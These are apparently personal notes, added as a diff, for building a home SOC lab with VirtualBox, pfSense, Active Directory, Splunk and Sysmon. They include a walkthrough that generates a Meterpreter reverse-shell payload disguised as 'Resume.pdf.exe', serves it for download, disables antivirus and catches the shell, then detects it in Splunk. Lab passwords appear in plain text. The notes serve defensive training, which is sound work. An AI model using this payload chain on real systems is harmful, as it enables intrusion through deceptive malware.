@@ -1,0 +1,87 @@
+https://www.youtube.com/watch?v=BwAD8w05D5A&list=PLUkY1OVVHzVktZOecfiDxdIodK4l5KkwY
+Download Virtual Box
+Download Linux, Metasploitable2, Windows 11, and Windows 2022 Server
+Create a lab folder in C drive
+Import/Add all four into Hypervisor
+Remake to appropriate names (Kali Linux, Win11, Metasploitable 2, DC1 (Server))
+Connect all to same switch
+Settings -> Network -> Bridged Adapter -> reltek
+Kali - 192.168.1.176 /24
+Mask - 255.255.255.0
+Win11 - 192.168.1.11
+Default Gateway - 192.168.1.1
+DC1 - 192.168.1.22				DNS: 8.8.8.8				Login - Administrator/Red!
+Metasploitable 2 - 192.168.1.179								Login - msfadmin
+Ping each machine to see they are connected
+Windows 11 is default PING off, can enable PING or disable firewall
+Changed IP of Win11 and DC1 to 192.168.1.11 and 192.168.1.22
+DNS of Win11 is IP of DC1
+Pinged work from both
+DC1 -> Manage -> add roles and features -> Active Directory Domain Services + DNS Server -> add -> next
+Promote this server to Domain Controller
+Add new forest because we are creating this system from scratch
+Tools -> Active Directory users and Computers
+Forest -> Users -> Right click new -> User -> name etc
+MCSA Cert to learn about active directory, etc
+Connect Win11 to Server -> Right click windows icon -> system -> Advanced system settings for System properties
+Computer Name -> Change -> member of -> Domain
+Input Domain -> Login as Administrator
+To make a sandbox network (can only communicate with systems that are in the network)
+Ctrl + h -> create -> configure -> enable DHCP Server -> set the networks of machines to that virtual adapter (NO INTERNET)
+Nat Network -> Hypervisor is the router -> preferences -> network -> plus -> Select and third icon -> network Name -> support DHCP -> configure network -> OK -> set the rest to NAT (INTERNET SUPPORTED)
+Internal Network -> VM's connected but not to host (good for malware analysis but no internet) create internet network and statically set IPs on machines, not attached (no attachment, good for malware analysis), NAT (VM's own networks), NAT network (HV is router/host)
+SPLUNK fundamental Course
+Splunk -> S############1@gmail.com -> R$$$$$$$$!
+Learn Sysmon
+nmap -A 192.168.1.11 (Win11) -Pn
+Download Firewall pfsense at pfsense.org/download/ -> AMD64 -> DVD ISO
+VM - New -> Type BSD -> FreeBSD (64-Bit)
+Disable USB
+Run -> default -> reboot and shut down machine as soon as enter reboot -> settings of pfSense VM -> storage -> remove ISO
+run again -> n -> em0 -> enter
+192.168.1.181/24 pfSense WAN emo0
+Go to browser on host, go to ip of pfsense, hit next till set dns to 8.8.8.8
+configure WAN interface -> static -> ip address, subnet mask, gateway -> next
+website going to hack -> defendtheweb.net
+cmd -> nslookup -> defendtheweb.net to get address -> 3.10.42.19
+Firewall -> Alias -> Add -> Name -> IP
+Firewall -> Rules -> Block -> Protocol ANY -> Source Network 192.168.1.0/24 -> Destination Address or Alias DefendTheWebDOTnet
+Reject -> block packet and reply			Block -> just block say nothing
+Enable from all -> new -> any -> save
+Main PC -> Control Center -> network and sharing -> Ethernet -> Ipv4 -> properties -> Static -> set IP of PC -> set subnet 255.255.255.0 -> Default gateway is Firewall IP (192.168.1.181) -> DNS server Firewall IP -> alternate 8.8.8.8
+Set Clones or should really do new VMS -> settings -> internal network -> name network -> set both to that, make sure to select drop down and verify both are same
+Win Clone -> 192.168.1.12				Kali Clone -> 192.168.1.13
+Port 135/139/445 Open
+msfvenom to make malware -> try to look into making it undetectable
+windows/x64/meterpreter/reverse_tcp
+msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.1.13 lport=4444 -f exe -o Resume.pdf.exe
+msfconsole after it's made, use ls to check, after that do -> use exploit/multi/handler
+type options to see what can be configured, -> set payload windows/x64/meterpreter/reverse_tcp
+set lhost -> set lhost 192.168.1.13 (kali ip) -> type -> exploit, to run the malware
+make new console -> python3 -m http.server 9999 (port not in use) -> this allows the windows machine to download the malware from kali
+disable real time protection on windows vm -> to go kali ip and port of malware -> 192.168.1.13:9999 to download malware
+run malware -> run cmd as admin -> netstat -anob
+help -> shell -> net user -> net localgroup -> ipconfig in kali
+Make sure splunk is configured -> program files-> splunk -> etc -> system -> local -> inputs.conf (copy from default, if no sysmon dl his)
+services -> restart splunkd services -> create endpoint index by going to splunk -> localhost:8000 -> setting -> indexes -> new index -> endpoint
+apps -> find more apps -> splunk add-on for sysmon -> app search -> index=endpoint 192.168.1.13 (kali ip) -> dest_port see if it does anything
+index=endpoint Resume.pdf.exe -> EventCode 1 -> ParentImage -> process_id -> process_guid -> index=endpoint {process_guid} + shiftenter for new line -> | table _time,ParentImage,Image,CommandLine
+
+
+NEW SECTION - https://app.letsdefend.io/training/lesson_detail/pfsense
+Download pfsense - Make a new VM - Linux - Other(64x)
+Installed pfsense iso
+Remove iso file from settings and re-run
+select 1 to set up interfaces
+select n for vlan, set em0 for WAN, set em1 for LAN, set em2 for OPT1 - External (RED) em0- Internal (GREEN) em1- DMZ (ORANGE) em2
+Select to set up IP address, Set em0 to dhc1, set manual IP for em1 192.168.1.75/24, set as None for last thing
+Set n for http thing?
+Install windows server - create vm without iso first, set network to Green (INTERNAL), set iso in the settings, install enterprise gui version, set advanced, next and install
+Set password for Admin, log in, Go to network and sharing, adapter settings, ipv4 properties, set ip address, use the LAN ip (192.168.1.75) as the Default Gateway. Use 8.8.8.8 for DNS
+System - Rename - Restart
+Add roles and features -> Installation Type -> role-based installation -> next -> Server Roles -> Active Directory Domain Services -> Add features -> finish
+Click flag -> Promote this server to a domain controller -> Add new active directory forest -> add new forest -> root name = soc.lab -> Domain controller Options -> set restore Password = Try109! -> check netBIOS domain name = SOC -> launch install and reboot
+Download BadBlood -> can do from host and transfer over -> extract it -> launch powershell as admin -> cd .\Desktop\BadBlood\ -> ls -> .\Invoke-BadBlood.ps1 to install BadBlood
+Download Windows10 iso -> New vm with no ISO -> network Green -> launch -> Add iso -> install&reboot select custom -> Select region/keyboard, Don't have internet -> limited setup -> name -> security -> set other minimal value (no location, no track, etc)
+Set IP, default gateway as LAN IP, rename PC, reset, connect to domain in Advanced system settings, Computer Name, Change, set Domain to netbios domain name, login to domain Admin.
+If can't connect to domain, set DNS server to domain IP
